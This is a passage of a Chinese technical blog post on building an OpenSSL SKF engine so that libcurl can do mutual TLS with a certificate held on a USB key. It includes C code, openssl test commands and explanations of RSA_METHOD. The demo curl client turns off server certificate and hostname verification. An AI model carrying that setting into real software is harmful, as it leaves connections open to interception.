<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">size_t</span> <span class="title">curlWriteFunction</span><span class="params">(<span class="type">void</span> *ptr, <span class="type">size_t</span> size <span class="comment">/*always==1*/</span>, <span class="type">size_t</span> nmemb,</span></span></span><br><span class="line"><span class="params"><span class="function">                         <span class="type">void</span> *userdata)</span> </span>&#123;</span><br><span class="line">    <span class="type">char</span> **stringToWrite = (<span class="type">char</span> **)userdata;</span><br><span class="line">    <span class="type">const</span> <span class="type">char</span> *input = (<span class="type">const</span> <span class="type">char</span> *)ptr;</span><br><span class="line">    <span class="keyword">if</span> (nmemb == <span class="number">0</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (!*stringToWrite)</span><br><span class="line">        *stringToWrite = (<span class="type">char</span> *)<span class="built_in">malloc</span>(nmemb + <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        *stringToWrite = (<span class="type">char</span> *)<span class="built_in">realloc</span>(*stringToWrite, dataSize + nmemb + <span class="number">1</span>);</span><br><span class="line">    <span class="built_in">memcpy</span>(*stringToWrite + dataSize, input, nmemb);</span><br><span class="line">    dataSize += nmemb;</span><br><span class="line">    (*stringToWrite)[dataSize] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">    <span class="keyword">return</span> nmemb;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* The SSL initialisation callback. The callback sets:</span></span><br><span class="line"><span class="comment">   - a private key and certificate</span></span><br><span class="line"><span class="comment">   - a trusted ca certificate</span></span><br><span class="line"><span class="comment">   - a preferred cipherlist</span></span><br><span class="line"><span class="comment">   - an application verification callback (the function above)</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="type">static</span> CURLcode <span class="title">sslctxfun</span><span class="params">(CURL *curl, <span class="type">void</span> *sslctx, <span class="type">void</span> *parm)</span> </span>&#123;</span><br><span class="line">    SSL_CTX *ctx = (SSL_CTX *)sslctx;</span><br><span class="line">    ENGINE *ssl_client_engine = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">do</span> &#123;</span><br><span class="line">        ssl_client_engine = <span class="built_in">ENGINE_by_id</span>(<span class="string">&quot;skf&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (ssl_client_engine == <span class="literal">NULL</span>) &#123;</span><br><span class="line">            <span class="built_in">fprintf</span>(stderr, <span class="string">&quot;get engine failed\n&quot;</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="built_in">SSL_CTX_set_client_cert_engine</span>(ctx, ssl_client_engine)) &#123;</span><br><span class="line">            <span class="built_in">fprintf</span>(stderr, <span class="string">&quot;Error setting client auth engine\n&quot;</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> CURLE_OK;</span><br><span class="line">    &#125; <span class="keyword">while</span> (<span class="literal">false</span>);</span><br><span class="line">    <span class="built_in">ENGINE_free</span>(ssl_client_engine);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> CURLE_FAILED_INIT;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (argc &lt; <span class="number">2</span>) &#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(stdout, <span class="string">&quot;Usage: curl_engine.exe &lt;URL&gt;\n&quot;</span>);</span><br><span class="line">        <span class="built_in">fprintf</span>(stdout, <span class="string">&quot;\texample: curl_engine.exe https://xxx.xxx.xxx.xxx\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> *data = <span class="number">0</span>;</span><br><span class="line">    CURL *<span class="type">const</span> curl = <span class="built_in">curl_easy_init</span>();</span><br><span class="line">    <span class="keyword">if</span> (!curl) &#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(stderr, <span class="string">&quot;Failed to init curl&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">curl_easy_setopt</span>(curl, CURLOPT_URL, argv[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">curl_easy_setopt</span>(curl, CURLOPT_VERBOSE, <span class="number">1L</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/******************** 引擎加载选项 begin ********************/</span></span><br><span class="line">    <span class="comment">// 设置curl加载引擎</span></span><br><span class="line">    <span class="built_in">curl_easy_setopt</span>(curl, CURLOPT_SSLENGINE, <span class="string">&quot;skf&quot;</span>);</span><br><span class="line">    <span class="comment">// 设置curl将默认算法使用引擎提供的算法</span></span><br><span class="line">    <span class="built_in">curl_easy_setopt</span>(curl, CURLOPT_SSLENGINE_DEFAULT, <span class="number">1L</span>);</span><br><span class="line">    <span class="comment">// 如果需要使用引擎中的客户端提供证书接口，需要设置此选项</span></span><br><span class="line">    <span class="built_in">curl_easy_setopt</span>(curl, CURLOPT_SSL_CTX_FUNCTION, sslctxfun);</span><br><span class="line">    <span class="comment">/******************** 引擎加载选项 end ********************/</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">curl_easy_setopt</span>(curl, CURLOPT_CONNECTTIMEOUT_MS, <span class="number">3</span> * <span class="number">1000</span>);</span><br><span class="line">    <span class="built_in">curl_easy_setopt</span>(curl, CURLOPT_TIMEOUT_MS, <span class="number">3</span> * <span class="number">1000</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">curl_easy_setopt</span>(curl, CURLOPT_SSL_VERIFYPEER, <span class="number">0L</span>);</span><br><span class="line">    <span class="built_in">curl_easy_setopt</span>(curl, CURLOPT_SSL_VERIFYHOST, <span class="number">0L</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">curl_easy_setopt</span>(curl, CURLOPT_WRITEDATA, &amp;data);</span><br><span class="line">    <span class="built_in">curl_easy_setopt</span>(curl, CURLOPT_WRITEFUNCTION, &amp;curlWriteFunction);</span><br><span class="line"></span><br><span class="line">    CURLcode mc = <span class="built_in">curl_easy_perform</span>(curl);</span><br><span class="line">    <span class="keyword">if</span> (mc != CURLE_OK) &#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(stderr, <span class="string">&quot;Failed to get web page, curl error: %s\n&quot;</span>,</span><br><span class="line">                <span class="built_in">curl_easy_strerror</span>(mc));</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">curl_easy_cleanup</span>(curl);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!data) &#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(stderr, <span class="string">&quot;Got no data\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Page data:\n\n%s\n&quot;</span>, data);</span><br><span class="line">    <span class="built_in">free</span>(data);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="1-5-测试命令"><a href="#1-5-测试命令" class="headerlink" title="1.5. 测试命令"></a>1.5. 测试命令</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">服务端监听命令，重点是-CAfile需要使用ukey里面的证书对应的ca根证书</span></span><br><span class="line">openssl s_server -accept 777 -tls1_1 -state -debug -cipher ECC-SM4-SM3 -state -key ./apps/certs/sm2sign.key -cert ./apps/certs/sm2sign.crt -ekey ./apps/certs/sm2enc.key -ecert ./apps/certs/sm2enc.crt -CAfile ./apps/certs/server.crt -Verify 1</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">客户端请求使用skf引擎</span></span><br><span class="line">openssl s_client -engine skf -ssl_client_engine skf -connect 127.0.0.1:777 -state -cipher ECC-SM4-SM3</span><br></pre></td></tr></table></figure>

<h3 id="1-6-使用skf接口实现rsa引擎"><a href="#1-6-使用skf接口实现rsa引擎" class="headerlink" title="1.6. 使用skf接口实现rsa引擎"></a>1.6. 使用skf接口实现rsa引擎</h3><ul>
<li>openssl的rsa签名校验原理先看 <a href="#4-rsa%E7%AD%BE%E5%90%8D%E4%B8%8E%E6%A0%A1%E9%AA%8C">rsa签名与校验</a>，后文对于相关的知识讲解会略过</li>
<li><a href="https://max.book118.com/html/2018/0618/173250950.shtm">skf接口文档</a></li>
</ul>
<h4 id="1-需要用到的skf引擎的关键函数"><a href="#1-需要用到的skf引擎的关键函数" class="headerlink" title="1) 需要用到的skf引擎的关键函数"></a>1) 需要用到的skf引擎的关键函数</h4><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 导出证书</span></span><br><span class="line"><span class="comment">// bSignFlag TRUE为签名证书，FALSE为加密证书</span></span><br><span class="line"><span class="function">ULONG DEVAPI <span class="title">SKF_ExportCertificate</span><span class="params">(HCONTAINER hContainer, BOOL bSignFlag,</span></span></span><br><span class="line"><span class="params"><span class="function">                                   BYTE *pbCert, ULONG *pulCertLen)</span></span>;</span><br><span class="line"><span class="comment">// 导出证书的公钥</span></span><br><span class="line"><span class="comment">// bSignFlag TRUE为签名证书，FALSE为加密证书</span></span><br><span class="line"><span class="function">ULONG DEVAPI <span class="title">SKF_ExportPublicKey</span><span class="params">(HCONTAINER hContainer, BOOL bSignFlag,</span></span></span><br><span class="line"><span class="params"><span class="function">                                 BYTE *pbBlob, ULONG *pulBlobLen)</span></span>;</span><br><span class="line"><span class="comment">// 使用签名证书的私钥进行签名</span></span><br><span class="line"><span class="function">ULONG DEVAPI <span class="title">SKF_RSASignData</span><span class="params">(HCONTAINER hContainer, BYTE *pbData,</span></span></span><br><span class="line"><span class="params"><span class="function">                             ULONG ulDataLen, BYTE *pbSignature,</span></span></span><br><span class="line"><span class="params"><span class="function">                             ULONG *pulSignLen)</span></span>;</span><br><span class="line"><span class="comment">// 获取容器类型，1为rsa，2为ecc</span></span><br><span class="line"><span class="function">ULONG DEVAPI <span class="title">SKF_GetContainerType</span><span class="params">(HCONTAINER hContainer,</span></span></span><br><span class="line"><span class="params"><span class="function">                                  ULONG *pulContainerType)</span></span>;</span><br></pre></td></tr></table></figure>

<h4 id="2-skf导出数据到openssl结构体的工具函数"><a href="#2-skf导出数据到openssl结构体的工具函数" class="headerlink" title="2) skf导出数据到openssl结构体的工具函数"></a>2) skf导出数据到openssl结构体的工具函数</h4><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 将导出的公钥结构体设置到rsa结构体的公钥部分</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">RSA_set_RSAPUBLICKEYBLOB</span><span class="params">(RSA *rsa, <span class="type">const</span> RSAPUBLICKEYBLOB *blob)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="type">int</span> ret = <span class="number">0</span>;</span><br><span class="line">	BIGNUM *n = <span class="literal">NULL</span>;</span><br><span class="line">	BIGNUM *e = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (!rsa || !blob) &#123;</span><br><span class="line">        <span class="built_in">LOG_ERROR</span>(Tag, <span class="string">&quot;!rsa || !blob&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> ((blob-&gt;BitLen &lt; OPENSSL_RSA_FIPS_MIN_MODULUS_BITS)</span><br><span class="line">		|| (blob-&gt;BitLen &gt; <span class="built_in">sizeof</span>(blob-&gt;Modulus) * <span class="number">8</span>)</span><br><span class="line">		|| (blob-&gt;BitLen % <span class="number">8</span> != <span class="number">0</span>)) &#123;</span><br><span class="line">        <span class="built_in">LOG_ERROR</span>(Tag, <span class="string">&quot;blob-&gt;BitLen &lt; OPENSSL_RSA_FIPS_MIN_MODULUS_BITS&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 导出两个大质数的乘积n</span></span><br><span class="line">	<span class="keyword">if</span> (!(n = <span class="built_in">BN_bin2bn</span>(blob-&gt;Modulus, <span class="built_in">sizeof</span>(blob-&gt;Modulus), <span class="literal">NULL</span>))) &#123;</span><br><span class="line">        <span class="built_in">LOG_ERROR</span>(Tag, <span class="string">&quot;n = BN_bin2bn(blob-&gt;Modulus, sizeof(blob-&gt;Modulus), NULL)&quot;</span>);</span><br><span class="line">		<span class="keyword">goto</span> end;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 导出公钥的e</span></span><br><span class="line">	<span class="keyword">if</span> (!(e = <span class="built_in">BN_bin2bn</span>(blob-&gt;PublicExponent,</span><br><span class="line">		<span class="built_in">sizeof</span>(blob-&gt;PublicExponent), <span class="literal">NULL</span>))) &#123;</span><br><span class="line">        <span class="built_in">LOG_ERROR</span>(Tag, <span class="string">&quot;e = BN_bin2bn(blob-&gt;PublicExponent&quot;</span>);</span><br><span class="line">		<span class="keyword">goto</span> end;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 设置rsa的n和e，对应的是rsa算法的公钥部分</span></span><br><span class="line">	<span class="keyword">if</span> (!<span class="built_in">RSA_set0_key</span>(rsa, n, e, <span class="literal">NULL</span>)) &#123;</span><br><span class="line">        <span class="built_in">LOG_ERROR</span>(Tag, <span class="string">&quot;RSA_set0_key(rsa, n, e, NULL)&quot;</span>);</span><br><span class="line">		<span class="keyword">goto</span> end;</span><br><span class="line">	&#125;</span><br><span class="line">	n = <span class="literal">NULL</span>;</span><br><span class="line">	e = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">	ret = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">end:</span><br><span class="line">	<span class="built_in">BN_free</span>(n);</span><br><span class="line">	<span class="built_in">BN_free</span>(e);</span><br><span class="line">	<span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="3-openssl中需要用到的一些函数和结构体讲解"><a href="#3-openssl中需要用到的一些函数和结构体讲解" class="headerlink" title="3) openssl中需要用到的一些函数和结构体讲解"></a>3) openssl中需要用到的一些函数和结构体讲解</h4><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">/********** include/openssl/rsa.h **********/</span></span><br><span class="line"><span class="comment">// 获取openssl内置的默认rsa_method</span></span><br><span class="line"><span class="function"><span class="type">const</span> RSA_METHOD *<span class="title">RSA_get_default_method</span><span class="params">(<span class="type">void</span>)</span></span>;</span><br><span class="line"><span class="comment">// 将已有的rsa_method拷贝一份，防止修改到原始的结构体</span></span><br><span class="line"><span class="function">RSA_METHOD *<span class="title">RSA_meth_dup</span><span class="params">(<span class="type">const</span> RSA_METHOD *meth)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/********** include/openssl/engine.h **********/</span></span><br><span class="line"><span class="comment">// 在引擎中设置rsa_meth，skf接口需要自定义一些算法，所以要自定义rsa_meth</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">ENGINE_set_RSA</span><span class="params">(ENGINE *e, <span class="type">const</span> RSA_METHOD *rsa_meth)</span></span>;</span><br><span class="line"><span class="comment">// 设置加载客户端证书的函数，这里要自定义从skf接口取出证书</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">ENGINE_set_load_ssl_client_cert_function</span><span class="params">(ENGINE *e,</span></span></span><br><span class="line"><span class="params"><span class="function">                                             ENGINE_SSL_CLIENT_CERT_PTR</span></span></span><br><span class="line"><span class="params"><span class="function">                                             loadssl_f)</span></span>;</span><br></pre></td></tr></table></figure>

<ul>
<li><code>rsa_method</code>是非导出的，具体的内容如下</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// crypto/rsa/rsa_local.h</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">rsa_meth_st</span> &#123;</span><br><span class="line">    <span class="type">char</span> *name;</span><br><span class="line">    <span class="comment">// 公钥加密函数</span></span><br><span class="line">    <span class="built_in">int</span> (*rsa_pub_enc) (<span class="type">int</span> flen, <span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span> *from,</span><br><span class="line">                        <span class="type">unsigned</span> <span class="type">char</span> *to, RSA *rsa, <span class="type">int</span> padding);</span><br><span class="line">    <span class="comment">// 公钥解密函数</span></span><br><span class="line">    <span class="built_in">int</span> (*rsa_pub_dec) (<span class="type">int</span> flen, <span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span> *from,</span><br><span class="line">                        <span class="type">unsigned</span> <span class="type">char</span> *to, RSA *rsa, <span class="type">int</span> padding);</span><br><span class="line">    <span class="comment">// 私钥加密函数</span></span><br><span class="line">    <span class="built_in">int</span> (*rsa_priv_enc) (<span class="type">int</span> flen, <span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span> *from,</span><br><span class="line">                         <span class="type">unsigned</span> <span class="type">char</span> *to, RSA *rsa, <span class="type">int</span> padding);</span><br><span class="line">    <span class="comment">// 私钥解密函数</span></span><br><span class="line">    <span class="built_in">int</span> (*rsa_priv_dec) (<span class="type">int</span> flen, <span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span> *from,</span><br><span class="line">                         <span class="type">unsigned</span> <span class="type">char</span> *to, RSA *rsa, <span class="type">int</span> padding);</span><br><span class="line">    <span class="comment">// 默认私钥解密函数中用到的模解密函数，rsa-&gt;flags控制使用哪一个</span></span><br><span class="line">    <span class="comment">/* Can be null */</span></span><br><span class="line">    <span class="built_in">int</span> (*rsa_mod_exp) (BIGNUM *r0, <span class="type">const</span> BIGNUM *I, RSA *rsa, BN_CTX *ctx);</span><br><span class="line">    <span class="comment">// 和上面一样默认私钥解密函数中用到的模解密函数，用到的是n和d</span></span><br><span class="line">    <span class="comment">/* Can be null */</span></span><br><span class="line">    <span class="built_in">int</span> (*bn_mod_exp) (BIGNUM *r, <span class="type">const</span> BIGNUM *a, <span class="type">const</span> BIGNUM *p,</span><br><span class="line">                       <span class="type">const</span> BIGNUM *m, BN_CTX *ctx, BN_MONT_CTX *m_ctx);</span><br><span class="line">    <span class="comment">/* called at new */</span></span><br><span class="line">    <span class="built_in">int</span> (*init) (RSA *rsa);</span><br><span class="line">    <span class="comment">/* called at free */</span></span><br><span class="line">    <span class="built_in">int</span> (*finish) (RSA *rsa);</span><br><span class="line">    <span class="comment">/* RSA_METHOD_FLAG_* things */</span></span><br><span class="line">    <span class="type">int</span> flags;</span><br><span class="line">    <span class="comment">/* may be needed! */</span></span><br><span class="line">    <span class="type">char</span> *app_data;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * New sign and verify functions: some libraries don&#x27;t allow arbitrary</span></span><br><span class="line"><span class="comment">     * data to be signed/verified: this allows them to be used. Note: for</span></span><br><span class="line"><span class="comment">     * this to work the RSA_public_decrypt() and RSA_private_encrypt() should</span></span><br><span class="line"><span class="comment">     * *NOT* be used RSA_sign(), RSA_verify() should be used instead.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="built_in">int</span> (*rsa_sign) (<span class="type">int</span> type,</span><br><span class="line">                     <span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span> *m, <span class="type">unsigned</span> <span class="type">int</span> m_length,</span><br><span class="line">                     <span class="type">unsigned</span> <span class="type">char</span> *sigret, <span class="type">unsigned</span> <span class="type">int</span> *siglen,</span><br><span class="line">                     <span class="type">const</span> RSA *rsa);</span><br><span class="line">    <span class="built_in">int</span> (*rsa_verify) (<span class="type">int</span> dtype, <span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span> *m,</span><br><span class="line">                       <span class="type">unsigned</span> <span class="type">int</span> m_length, <span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span> *sigbuf,</span><br><span class="line">                       <span class="type">unsigned</span> <span class="type">int</span> siglen, <span class="type">const</span> RSA *rsa);</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * If this callback is NULL, the builtin software RSA key-gen will be</span></span><br><span class="line"><span class="comment">     * used. This is for behavioural compatibility whilst the code gets</span></span><br><span class="line"><span class="comment">     * rewired, but one day it would be nice to assume there are no such</span></span><br><span class="line"><span class="comment">     * things as &quot;builtin software&quot; implementations.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="built_in">int</span> (*rsa_keygen) (RSA *rsa, <span class="type">int</span> bits, BIGNUM *e, BN_GENCB *cb);</span><br><span class="line">    <span class="built_in">int</span> (*rsa_multi_prime_keygen) (RSA *rsa, <span class="type">int</span> bits, <span class="type">int</span> primes,</span><br><span class="line">                                   BIGNUM *e, BN_GENCB *cb);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<ul>
<li>openssl的默认<code>rsa_method</code>如下</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// crypto/rsa/rsa_ossl.c</span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> RSA_METHOD rsa_pkcs1_ossl_meth = &#123;</span><br><span class="line">    <span class="string">&quot;OpenSSL PKCS#1 RSA&quot;</span>,</span><br><span class="line">    rsa_ossl_public_encrypt,</span><br><span class="line">    rsa_ossl_public_decrypt,     <span class="comment">/* signature verification */</span></span><br><span class="line">    rsa_ossl_private_encrypt,    <span class="comment">/* signing */</span></span><br><span class="line">    rsa_ossl_private_decrypt,</span><br><span class="line">    rsa_ossl_mod_exp,</span><br><span class="line">    BN_mod_exp_mont,            <span class="comment">/* XXX probably we should not use Montgomery</span></span><br><span class="line"><span class="comment">                                 * if e == 3 */</span></span><br><span class="line">    rsa_ossl_init,</span><br><span class="line">    rsa_ossl_finish,</span><br><span class="line">    RSA_FLAG_FIPS_METHOD,       <span class="comment">/* flags */</span></span><br><span class="line">    <span class="literal">NULL</span>,</span><br><span class="line">    <span class="comment">// sign和verify标0代表使用默认签名和校验函数，而非不使用</span></span><br><span class="line">    <span class="number">0</span>,                          <span class="comment">/* rsa_sign */</span></span><br><span class="line">    <span class="number">0</span>,                          <span class="comment">/* rsa_verify */</span></span><br><span class="line">    <span class="literal">NULL</span>,                       <span class="comment">/* rsa_keygen */</span></span><br><span class="line">    <span class="literal">NULL</span>                        <span class="comment">/* rsa_multi_prime_keygen */</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">const</span> RSA_METHOD *default_RSA_meth = &amp;rsa_pkcs1_ossl_meth;</span><br></pre></td></tr></table></figure>

<h4 id="4-结合skf和openssl的原理讲解一下"><a href="#4-结合skf和openssl的原理讲解一下" class="headerlink" title="4) 结合skf和openssl的原理讲解一下"></a>4) 结合skf和openssl的原理讲解一下</h4><ul>
<li>使用skf引擎一般是使用ukey进行证书双向认证，双向认证的流程解析查看 <a href="#2-%E5%8F%8C%E5%90%91%E8%AE%A4%E8%AF%81%E6%B5%81%E7%A8%8B">双向认证流程</a></li>
<li>ukey保证安全性，私钥是不允许导出的，所以<strong>私钥签名</strong>这一步需要自己实现</li>
<li>证书存在于ukey中，所以需要修改<strong>加载证书</strong>的函数</li>
<li>私钥解密不需要，因为双向认证过程中没有服务端使用客户端上传的公钥加密的过程</li>
<li>公钥加密在客户端角度是使用服务端的公钥加密上传的数据，这里软件实现即可，不需要ukey的硬件实现</li>
<li>公钥解密同样软件实现即可</li>
</ul>
<h4 id="5-引擎设置代码"><a href="#5-引擎设置代码" class="headerlink" title="5) 引擎设置代码"></a>5) 引擎设置代码</h4><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">static</span> <span class="type">int</span> <span class="title">skf_load_rsa_client_cert</span><span class="params">(X509** pcert, EVP_PKEY** ppkey)</span> </span>&#123;</span><br><span class="line">    <span class="type">const</span> <span class="type">char</span>* operation = <span class="string">&quot;load rsa client cert&quot;</span>;</span><br><span class="line">    RSAPUBLICKEYBLOB pubKey = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    EVP_PKEY* pkey = <span class="literal">NULL</span>;</span><br><span class="line">    RSA* r = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="type">int</span> iResult = <span class="number">0</span>;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> certContetBITS[<span class="number">8192</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    ULONG ulCertLen = <span class="built_in">sizeof</span>(certContetBITS);</span><br><span class="line">    BIO* b = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">LOG_INFO</span>(Tag, <span class="string">&quot;%s&quot;</span>, operation);</span><br><span class="line">    <span class="keyword">do</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> ((pkey = <span class="built_in">EVP_PKEY_new</span>()) == <span class="literal">NULL</span>) &#123;</span><br><span class="line">            <span class="built_in">LOG_ERROR</span>(Tag, <span class="string">&quot;[%s] new EVP_PKEY failed&quot;</span>, operation);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 导出公钥写入算法结构体</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">exportPublicKey</span>(TRUE, <span class="built_in">reinterpret_cast</span>&lt;<span class="type">unsigned</span> <span class="type">char</span>*&gt;(&amp;pubKey), <span class="built_in">sizeof</span>(pubKey)) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="built_in">LOG_ERROR</span>(Tag, <span class="string">&quot;[%s] export public key from skf failed&quot;</span>, operation);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">LOG_INFO</span>(Tag, <span class="string">&quot;export public key success&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> ((r = <span class="built_in">RSA_new</span>()) == <span class="literal">NULL</span>) &#123;</span><br><span class="line">            <span class="built_in">LOG_ERROR</span>(Tag, <span class="string">&quot;[%s] new RSA failed&quot;</span>, operation);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!<span class="built_in">RSA_set_RSAPUBLICKEYBLOB</span>(r, &amp;pubKey)) &#123;</span><br><span class="line">            <span class="built_in">LOG_ERROR</span>(Tag, <span class="string">&quot;[%s] set public key to rsa failed&quot;</span>, operation);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="built_in">EVP_PKEY_assign_RSA</span>(pkey, r)) &#123;</span><br><span class="line">            <span class="built_in">LOG_ERROR</span>(Tag, <span class="string">&quot;[%s] assign rsa to EVP_KEY failed&quot;</span>, operation);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        *ppkey = pkey;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 导出签名证书写入证书指针</span></span><br><span class="line">        <span class="keyword">if</span> (!<span class="built_in">exportCertificate</span>(TRUE, certContetBITS, ulCertLen)) &#123;</span><br><span class="line">            <span class="built_in">LOG_ERROR</span>(Tag, <span class="string">&quot;[%s], export sign certificate by skf failed&quot;</span>, operation);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">LOG_INFO</span>(Tag, <span class="string">&quot;export sign certificate by skf certLen[%d]&quot;</span>, ulCertLen);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> ((b = <span class="built_in">BIO_new</span>(<span class="built_in">BIO_s_mem</span>())) == <span class="literal">NULL</span>) &#123;</span><br><span class="line">            <span class="built_in">LOG_ERROR</span>(Tag, <span class="string">&quot;[%s], new BIO failed&quot;</span>, operation);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">BIO_write</span>(b, certContetBITS, ulCertLen);</span><br><span class="line">        *pcert = <span class="built_in">d2i_X509_bio</span>(b, <span class="literal">NULL</span>);</span><br><span class="line">        <span class="keyword">if</span> (*pcert == <span class="literal">NULL</span>) &#123;</span><br><span class="line">            <span class="built_in">LOG_ERROR</span>(Tag, <span class="string">&quot;[%s], d2i_X509_bio failed&quot;</span>, operation);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        iResult = <span class="number">1</span>;</span><br><span class="line">        <span class="built_in">LOG_INFO</span>(Tag, <span class="string">&quot;%s success&quot;</span>, operation);</span><br><span class="line">    &#125; <span class="keyword">while</span> (<span class="literal">false</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (b != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">BIO_free</span>(b);</span><br><span class="line">        b = <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 成功部分指针不需要清理</span></span><br><span class="line">    <span class="keyword">if</span> (iResult == <span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> iResult;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span 